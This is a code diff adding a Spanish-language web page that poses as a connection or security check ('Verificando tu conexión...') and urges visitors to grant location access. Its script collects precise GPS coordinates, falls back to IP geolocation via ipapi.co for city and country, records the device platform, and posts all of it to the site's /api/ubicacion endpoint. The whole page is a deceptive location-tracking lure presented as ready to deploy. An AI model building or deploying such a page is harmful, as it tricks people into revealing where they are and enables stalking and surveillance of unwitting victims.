@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando Servicio</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f9; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Verificando tu conexión...</h2>
+    <p>Por favor, si el navegador solicita acceso a tu ubicación, acéptalo para continuar con la validación de seguridad.</p>
+
+    <script>
+        window.onload = function() {
+            let plataforma = "Desconocido";
+            if (/Android/i.test(navigator.userAgent)) plataforma = "Android";
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) plataforma = "Apple iOS";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (posicion) => {
+                        enviarAlServidor({
+                            plataforma: plataforma,
+                            tipo: 'GPS (Preciso)',
+                            latitud: posicion.coords.latitude,
+                            longitude: posicion.coords.longitude,
+                            precision: posicion.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        rastrearPorIP(plataforma);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } else {
+                rastrearPorIP(plataforma);
+            }
+        };
+        function rastrearPorIP(plataforma) {
+            fetch('https://ipapi.co')
+            .then(res => res.json())
+            .then(data => {
+                enviarAlServidor({
+                    plataforma: plataforma,
+                    tipo: 'IP (Aproximado)',
+                    latitud: data.latitude,
+                    longitude: data.longitude,
+                    ciudad: data.city,
+                    pais: data.country_name
+                });
+            })
+            .catch(err => console.error("Error en contingencia IP", err));
+        }
+        function enviarAlServidor(datos) {
+            const urlBase = window.location.origin;
+            fetch(`${urlBase}/api/ubicacion`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    plataforma: datos.plataforma,
+                    tipo: datos.tipo,
+                    latitud: datos.latitud,
+                    longitud: datos.longitude,
+                    precision: datos.precision || null,
+                    ciudad: datos.ciudad || null,
+                    pais: datos.pais || null 
+                })
+            })
+            .then(res => res.json()) 
+            .then(data => {
+                console.log("Servidor respondió:", data);
+            })
+            .catch(err => console.error("Error al transmitir los datos:", err));
+        }
+    </script>
+</body>
+</html>
